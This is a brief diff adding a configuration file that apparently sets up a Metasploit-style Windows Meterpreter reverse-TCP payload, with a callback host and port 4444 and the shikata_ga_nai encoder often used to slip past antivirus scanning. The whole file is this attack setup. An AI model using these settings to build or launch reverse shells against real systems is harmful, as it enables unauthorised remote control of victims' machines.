@@ -1,0 +1,8 @@
+WorkMode=1
+LhOsT=192.168.1.1
+LpOrT=4444
+PaYlOaD=windows/meterpreter/reverse_tcp
+Cert_SSL=false
+VaL=false
+StAgE=false
+EnCoDe=x86/shikata_ga_nai
